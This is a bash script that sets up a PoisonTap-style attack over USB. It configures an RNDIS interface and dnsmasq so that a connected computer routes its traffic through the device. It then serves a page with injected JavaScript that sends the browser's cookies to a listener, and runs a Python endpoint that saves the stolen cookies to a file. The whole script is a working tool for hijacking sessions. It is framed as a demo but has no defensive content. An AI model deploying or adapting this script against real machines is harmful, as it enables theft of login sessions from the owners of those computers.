#!/bin/bash

# Bring up RNDIS interface with static IP
sudo ifconfig usb0 172.16.42.1 netmask 255.255.255.0 up

# Setup DNSMasq for DHCP, DNS, and serve as default gateway
sudo systemctl stop dnsmasq || true
cat <<EOF | sudo tee /etc/dnsmasq.d/usb0.conf
interface=usb0
dhcp-range=172.16.42.10,172.16.42.50,255.255.255.0,12h
dhcp-option=3,172.16.42.1
dhcp-option=6,172.16.42.1
listen-address=172.16.42.1
EOF
sudo systemctl restart dnsmasq

# Serve malicious index.html on all routes/hostnames via HTTP
sudo mkdir -p /srv/http
cat <<EOF | sudo tee /srv/http/index.html
<html>
  <body>
    <h1>PoisonTap Demo</h1>
    <script>
      // Steal cookies and exfiltrate via RNDIS
      fetch('http://172.16.42.1:8080/exfil', {
        method: 'POST',
        body: document.cookie
      });
      // Optionally inject persistent JS
      localStorage.setItem('infected','1');
    </script>
    <p>If you see this, your browser is vulnerable to RNDIS/PoisonTap tricks.</p>
  </body>
</html>
EOF

# Minimal exfil endpoint
cat <<EOF | sudo tee /srv/http/exfil.py
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
class Exfil(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open('/home/pi/exfil/cookies.txt','ab') as f:
            f.write(data+b'\\n')
        self.send_response(200)
        self.end_headers()
server = HTTPServer(('0.0.0.0', 8080), Exfil)
server.serve_forever()
EOF
chmod +x /srv/http/exfil.py

# Start both servers
cd /srv/http
sudo python3 -m http.server 80 &
sudo ./exfil.py &